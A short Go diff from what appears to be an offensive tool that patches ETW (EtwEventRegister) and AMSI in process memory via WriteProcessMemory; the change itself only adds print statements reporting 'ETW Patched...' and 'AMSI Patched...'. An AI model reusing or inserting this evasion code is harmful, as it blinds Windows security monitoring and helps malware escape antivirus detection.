@@ -2,6 +2,7 @@ package lib
 
 import (
 	"encoding/hex"
+	"fmt"
 	"syscall"
 	"unsafe"
 )
@@ -80,6 +81,8 @@ func ByETW() {
 	datalength := len(patch)
 	var nLength uintptr
 	WriteProcessMemory(handle, procEtwEventRegister.Addr(), &patch[0], uintptr(uint32(datalength)), &nLength)
+	
+	fmt.Println("ETW Patched...")
 }
 
 func ByAMSI(){
@@ -96,4 +99,6 @@ func ByAMSI(){
 		var nLength uintptr
 		WriteProcessMemory(handle, amsi[j], &patcha[0], uintptr(uint32(datalength)), &nLength)
 	}
+	
+	fmt.Println("AMSI Patched...")
 }
